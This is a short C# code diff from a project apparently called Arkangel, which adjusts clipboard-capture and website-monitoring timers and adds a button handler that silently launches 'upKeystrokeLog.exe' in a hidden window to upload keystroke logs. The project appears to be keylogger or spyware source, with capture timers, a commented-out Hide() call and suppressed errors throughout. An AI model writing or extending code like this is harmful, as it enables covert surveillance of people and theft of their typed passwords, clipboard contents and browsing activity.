@@ -248,11 +248,12 @@ namespace Arkangel
             //Hide();
 
             //Clipboard 
-            Functions.SetTimerClipboard(30 * 60 * 1000);
+            Functions.SetTimerClipboard(30 * 120 * 1000);
             aTimer_Clipboard.Start();
 
             //Website
-
+            Functions.SetTimerWebsite(120 * 60 * 60 * 1000);
+            aTimer_Website.Start();
 
         }
         private IntPtr _windowHandle;
@@ -491,6 +492,20 @@ namespace Arkangel
                 Functions.WriteClipboard();
             }
             catch { }
+        }
+
+        private void bt_sync_Click(object sender, RoutedEventArgs e)
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upKeystrokeLog.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+            Functions.syncDown();
         }
     }
 }
